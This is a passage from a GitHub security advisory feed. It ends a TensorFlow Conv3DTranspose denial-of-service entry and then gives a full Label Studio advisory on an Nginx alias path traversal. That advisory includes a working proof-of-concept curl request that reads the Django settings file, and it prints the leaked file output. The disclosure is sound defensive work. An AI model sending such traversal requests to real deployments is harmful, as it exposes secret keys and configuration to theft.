<p>This Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched the issue in</p>
<ul>
<li>GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li>GitHub commit <a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">85db5d07db54b853484bfd358c3894d948c36baf</a>.</li>
</ul>
<p>The fix will be included in TensorFlow 2.12.0. This commit will also be cherrypicked into TensorFlow 2.11.1.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">Tensor Flow's security guide</a> for more information regarding the security model and how to contact them with issues and questions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq</a></li>
<li><a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25661">https://nvd.nist.gov/vuln/detail/CVE-2023-25661</a></li>
<li><a href="https://github.com/advisories/GHSA-fxgc-95xx-grvq">https://github.com/advisories/GHSA-fxgc-95xx-grvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fxgc-95xx-grvq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:05:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Nginx alias path traversal allows unauthenticated attackers to read all files on /label_studio/core/]]></title>
        <id>https://github.com/advisories/GHSA-cpmr-mw4j-99r7</id>
        <link href="https://github.com/advisories/GHSA-cpmr-mw4j-99r7"/>
        <updated>2023-03-24T22:04:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The vulnerability resides on the Nginx config file:
<a href="https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></p>
<p>The pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash <code>/</code> at the end, the following code shows an example of a safe configuration:</p>
<pre><code class="language-nginx">location /static/ {
[...]
</code></pre>
<p>The vulnerability works because Nginx will think that <code>/static../</code> is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.</p>
<p>Of course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.
This is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)</p>
<p>** Proof-of-Concept (Leaking Secret Keys): **
Exploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.</p>
<pre><code class="language-bash"># Production Label Studio docker-compose running on localhost:8080
/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py
"""This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.
"""
import os
import pathlib

from core.settings.base import *

DJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)
DATABASES = {'default': DATABASES_ALL[DJANGO_DB]}

MIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')
MIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')
if INACTIVITY_SESSION_TIMEOUT_ENABLED:
    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')

ADD_DEFAULT_ML_BACKENDS = False

LOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')

DEBUG = get_bool_env('DEBUG', False)

DEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)

SESSION_COOKIE_SECURE = False

SESSION_ENGINE = "django.contrib.sessions.backends.signed_cookies"

RQ_QUEUES = {}

SENTRY_DSN = get_env(
    'SENTRY_DSN',
    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'
)
SENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')

FRONTEND_SENTRY_DSN = get_env(
    'FRONTEND_SENTRY_DSN',
    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')
FRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')

EDITOR_KEYMAP = json.dumps(get_env("EDITOR_KEYMAP"))

from label_studio import __version__
from label_studio.core.utils import sentry
sentry.init_sentry(release_name='label-studio', release_version=__version__)

# we should do it after sentry init
from label_studio.core.utils.common import collect_versions
versions = collect_versions()

# in Label Studio Community version, feature flags are always ON
FEATURE_FLAGS_DEFAULT_VALUE = True
# or if file is not set, default is using offline mode
FEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)

from core.utils.io import find_file
FEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')
FEATURE_FLAGS_FROM_FILE = True
try:
    from core.utils.io import find_node
    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')
except IOError:
    FEATURE_FLAGS_FROM_FILE = False

STORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)
</code></pre>
<h3 id="impact">Impact</h3>
<p>The impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7">https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7</a></li>
<li><a href="https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></li>
<li><a href="https://github.com/advisories/GHSA-cpmr-mw4j-99r7">https://github.com/advisories/GHSA-cpmr-mw4j-99r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cpmr-mw4j-99r7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-24T22:04:02.000Z</published>
    </entry>
</feed>